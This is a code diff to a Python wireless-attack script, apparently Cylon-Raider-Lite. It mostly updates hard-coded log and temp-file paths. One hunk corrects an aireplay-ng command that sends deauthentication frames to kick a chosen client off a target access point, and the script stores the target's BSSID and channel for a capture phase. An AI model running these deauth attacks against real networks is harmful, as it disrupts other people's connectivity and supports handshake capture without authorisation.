@@ -8,7 +8,7 @@ import sys
 import time
 import StringIO
 
-cap_file_dir = '/root/Cylon-Raider-Lite/logs/'
+cap_file_dir = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/'
 capture_Interface = 'wlan1mon'
 
 def deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, capture_Interface):
@@ -18,7 +18,6 @@ def deauth_target(attack_selected, capture_BSSID, capture_Channel, cap_file, cap
     elif attack_selected == "CLIENT":
         client_mac = str(raw_input("Enter connected client MAC addr: "))
         cmd_String = "aireplay-ng -0 0 -c %s -a %s --ignore-negative-one %s" % (
-            capture_Channel,
             client_mac,
             capture_BSSID,
             capture_Interface
@@ -41,10 +40,10 @@ def direct_or_client_deauth_question(capture_BSSID, capture_Channel, cap_file, c
 
 def save_target_lock(capture_BSSID, capture_Channel, cap_file, capture_Interface):
     # temporarily saves files to a few text files for StringIO to pick it up for the other phase
-    a = '/root/Cylon-Raider-Lite/logs/temp_BSSID'
-    b = '/root/Cylon-Raider-Lite/logs/temp_Channel'
-    c = '/root/Cylon-Raider-Lite/logs/temp_cap_file'
-    d = '/root/Cylon-Raider-Lite/logs/temp_cap_interface'
+    a = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_BSSID'
+    b = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_Channel'
+    c = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_file'
+    d = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_interface'
 
     a = open(a,'w')
     a.write(capture_BSSID)
@@ -90,19 +89,19 @@ def gather_target_info():
 def read_temp_files():
     # read temp files
     # re-saves data in a new variable (because we are in a new window now, so we need to import the data)
-    a = '/root/Cylon-Raider-Lite/logs/temp_BSSID'
+    a = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_BSSID'
     a = open(a,'r')
     a = a.read()
     capture_BSSID = a
-    b = '/root/Cylon-Raider-Lite/logs/temp_Channel'
+    b = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_Channel'
     b = open(b,'r')
     b = b.read()
     capture_Channel = b
-    c = '/root/Cylon-Raider-Lite/logs/temp_cap_file'
+    c = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_file'
     c = open(c,'r')
     c = c.read()
     cap_file = c
-    d = '/root/Cylon-Raider-Lite/logs/temp_cap_interface'
+    d = '/root/ArmsCommander/wirelessattacks/Cylon-Raider-Lite/logs/temp_cap_interface'
     d = open(d,'r')
     d = d.read()
     capture_Interface = d
